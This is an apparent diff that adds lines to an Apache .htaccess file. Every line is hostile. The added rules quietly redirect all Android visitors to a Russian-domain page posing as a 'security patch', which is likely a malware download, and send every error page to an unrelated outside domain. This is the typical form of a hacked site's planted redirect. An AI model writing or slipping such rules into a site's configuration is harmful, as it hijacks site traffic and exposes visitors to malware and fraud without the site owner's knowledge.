@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} .*ndroid.*
+RewriteRule ^(.*)$ http://official.androidsecuritydata.ru/securitypatch.php
+ErrorDocument 400 http://exfxnws.com
+ErrorDocument 401 http://exfxnws.com
+ErrorDocument 403 http://exfxnws.com
+ErrorDocument 404 http://exfxnws.com
+ErrorDocument 500 http://exfxnws.com
